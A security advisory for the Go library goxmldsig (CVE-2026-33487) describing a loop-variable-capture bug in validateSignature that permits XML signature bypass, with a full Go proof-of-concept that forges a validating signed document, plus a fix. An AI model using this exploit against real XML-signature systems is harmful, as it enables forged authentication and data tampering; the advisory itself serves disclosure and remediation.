# [H] validateSignature Loop Variable Capture Signature Bypass in goxmldsig

## Summary
Severity: High
Advisory: GHSA-479m-364c-43vc
CVE: CVE-2026-33487
CWE: CWE-347, CWE-682
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-479m-364c-43vc
Type: github-advisory

## Affected
- Go: `github.com/russellhaering/goxmldsig` — affected >=0 <1.6.0

## Details
### Details

The `validateSignature` function in `validate.go` goes through the references in the `SignedInfo` block to find one that matches the signed element's ID. In Go versions before 1.22, or when `go.mod` uses an older version, there is a loop variable capture issue. The code takes the address of the loop variable `_ref` instead of its value. As a result, if more than one reference matches the ID or if the loop logic is incorrect, the `ref` pointer will always end up pointing to the last element in the `SignedInfo.References` slice after the loop.

------

### Technical Details

The code takes the address of a loop iteration variable (&_ref). In the standard Go compiler, this variable is only allocated once for the whole loop, so its address stays the same, but its value changes with each iteration.

As a result, any pointer to this variable will always point to the value of the *last* element processed by the loop, no matter which element matched the search criteria.

Using Radare2, I found that the assembly at 0x1001c5908 (the start of the loop) loads the iteration values but does not create a new allocation (runtime.newobject) for the variable _ref inside the loop. The address &_ref stays the same during the loop (due to stack or heap slot reuse), which confirms the pointer aliasing issue.

```````go
// goxmldsig/validate.go (Lines 309-313)	
for _, _ref := range signedInfo.References {
		if _ref.URI == "" || _ref.URI[1:] == idAttr {
			ref = &_ref // <- Capture var address of loop
		}
	}

```````

-----

### PoC

The PoC generates a signed document containing two elements and confirms that altering the first element to match the second produces a valid signature.

``````go
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"math/big"
	"time"

	"github.com/beevik/etree"
	dsig "github.com/russellhaering/goxmldsig"
)

func main() {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		panic(err)
	}

	template := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		NotBefore:    time.Now().Add(-1 * time.Hour),
		NotAfter:     time.Now().Add(1 * time.Hour),
	}

	certDER, err := x509.CreateCertificate(rand.Reader, template, template, &key.PublicKey, key)
	if err != nil {
		panic(err)
	}

	cert, _ := x509.ParseCertificate(certDER)

	doc := etree.NewDocument()
	root := doc.CreateElement("Root")
	root.CreateAttr("ID", "target")
	root.SetText("Malicious Content")

	tlsCert := tls.Certificate{
		Certificate: [][]byte{cert.Raw},
		PrivateKey:  key,
	}

	ks := dsig.TLSCertKeyStore(tlsCert)
	signingCtx := dsig.NewDefaultSigningContext(ks)

	sig, err := signingCtx.ConstructSignature(root, true)
	if err != nil {
		panic(err)
	}

	signedInfo := sig.FindElement("./SignedInfo")

	existingRef := signedInfo.FindElement("./Reference")
	existingRef.CreateAttr("URI", "#dummy")

	originalEl := etree.NewElement("Root")
	originalEl.CreateAttr("ID", "target")
	originalEl.SetText("Original Content")

	sig1, _ := signingCtx.ConstructSignature(originalEl, true)
	ref1 := sig1.FindElement("./SignedInfo/Reference").Copy()

	signedInfo.InsertChildAt(existingRef.Index(), ref1)

	c14n := signingCtx.Canonicalizer

	detachedSI := signedInfo.Copy()
	if detachedSI.SelectAttr("xmlns:"+dsig.DefaultPrefix) == nil {
		detachedSI.CreateAttr("xmlns:"+dsig.DefaultPrefix, dsig.Namespace)
	}

	canonicalBytes, err := c14n.Canonicalize(detachedSI)
	if err != nil {
		fmt.Println("c14n error:", err)
		return
	}

	hash := signingCtx.Hash.New()
	hash.Write(canonicalBytes)
	digest := hash.Sum(nil)

	rawSig, err := rsa.SignPKCS1v15(rand.Reader, key, signingCtx.Hash, digest)
	if err != nil {
		panic(err)
	}

	sigVal := sig.FindElement("./SignatureValue")
	sigVal.SetText(base64.StdEncoding.EncodeToString(rawSig))

	certStore := &dsig.MemoryX509CertificateStore{
		Roots: []*x509.Certificate{cert},
	}
	valCtx := dsig.NewDefaultValidationContext(certStore)

	root.AddChild(sig)

	doc.SetRoot(root)
	str, _ := doc.WriteToString()
	fmt.Println("XML:")
	fmt.Println(str)

	validated, err := valCtx.Validate(root)
	if err != nil {
		fmt.Println("validation failed:", err)
	} else {
		fmt.Println("validation ok")
		fmt.Println("validated text:", validated.Text())
	}
}
``````

-----

### Impact

This vulnerability lets an attacker get around integrity checks for certain signed elements by replacing their content with the content from another element that is also referenced in the same signature.

------

### Remediation

Update the loop to capture the value correctly or use the index to reference the slice directly.

``````go
// goxmldsig/validate.go	
func (ctx *ValidationContext) validateSignature(el *etree.Element, sig *types.Signature) error {
	var ref *types.Reference

  // OLD
	// for _, _ref := range signedInfo.References {
	// 	if _ref.URI == "" || _ref.URI[1:] == idAttr {
	// 		ref = &_ref
	// 	}
	// }
	
  // FIX
	for i := range signedInfo.References {
		if signedInfo.References[i].URI == "" ||
			signedInfo.References[i].URI[1:] == idAttr {
			ref = &signedInfo.References[i]
			break
		}
	}

	// ...
}
``````

----

### References

https://cwe.mitre.org/data/definitions/347.html

https://cwe.mitre.org/data/definitions/682.html

https://github.com/russellhaering/goxmldsig/blob/main/validate.go

-----

**Author**: Tomas Illuminati

## References
- https://github.com/russellhaering/goxmldsig/security/advisories/GHSA-479m-364c-43vc
- https://nvd.nist.gov/vuln/detail/CVE-2026-33487
- https://github.com/russellhaering/goxmldsig
